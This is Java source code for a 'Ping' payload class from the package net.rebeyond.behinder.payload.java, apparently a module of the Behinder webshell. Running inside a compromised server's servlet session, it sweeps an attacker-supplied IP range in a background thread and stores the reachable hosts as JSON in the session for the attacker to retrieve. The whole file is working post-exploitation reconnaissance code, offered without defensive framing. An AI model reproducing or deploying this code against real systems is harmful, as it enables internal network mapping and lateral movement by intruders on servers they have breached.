package net.rebeyond.behinder.payload.java;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class Ping implements Runnable {
    public static String ipList;
    public static String taskID;
    private HttpSession Session;

    public Ping() {
    }

    public Ping(HttpSession session) {
        this.Session = session;
    }

    public void execute(ServletRequest request, ServletResponse response, HttpSession session) throws Exception {
        new Thread(new Ping(session)).start();
    }

    private static int ip2int(String ip) throws UnknownHostException {
        int result = 0;
        for (byte b : InetAddress.getByName(ip).getAddress()) {
            result = (result << 8) | (b & 255);
        }
        return result;
    }

    private static String int2ip(int value) throws UnknownHostException {
        return InetAddress.getByAddress(BigInteger.valueOf(value).toByteArray()).getHostAddress();
    }

    public static void main(String[] args) {
        String start = ipList.split("-")[0];
        String stop = ipList.split("-")[1];
        try {
            ip2int(start);
            ip2int(stop);
            for (int i = ip2int(start); i < ip2int(stop); i++) {
                InetAddress.getByName(int2ip(i)).isReachable(3000);
            }
        } catch (Exception e) {
        }
    }

    public void run() {
        String start = ipList.split("-")[0];
        String stop = ipList.split("-")[1];
        Map<String, String> sessionObj = new HashMap<>();
        Map<String, String> scanResult = new HashMap<>();
        sessionObj.put("running", "true");
        try {
            int startValue = ip2int(start);
            int stopValue = ip2int(stop);
            for (int i = startValue; i <= stopValue; i++) {
                String ip = int2ip(i);
                if (InetAddress.getByName(ip).isReachable(3000)) {
                    scanResult.put(ip, "true");
                    sessionObj.put("result", buildJson(scanResult, false));
                }
                this.Session.setAttribute(taskID, sessionObj);
            }
        } catch (Exception e) {
            sessionObj.put("result", e.getMessage());
        }
        sessionObj.put("running", "false");
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
}
